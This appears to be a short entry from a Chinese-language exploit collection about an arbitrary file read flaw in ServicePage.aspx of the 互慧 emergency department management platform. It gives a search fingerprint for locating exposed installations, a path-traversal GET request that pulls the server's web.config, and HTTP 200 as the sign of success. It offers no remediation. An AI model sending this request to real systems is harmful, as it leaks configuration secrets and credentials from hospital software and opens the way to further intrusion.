# 互慧-急诊综合管理平台ServicePage.aspx存在任意文件读取漏洞

互慧-急诊综合管理平台 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="/emis_lib/js/ThreeExtras.js"`
- **请求**：`GET /dcwriter/thirdpart/ServicePage.aspx?wasmres=./../web.config HTTP/1.1`
- **响应特征**：200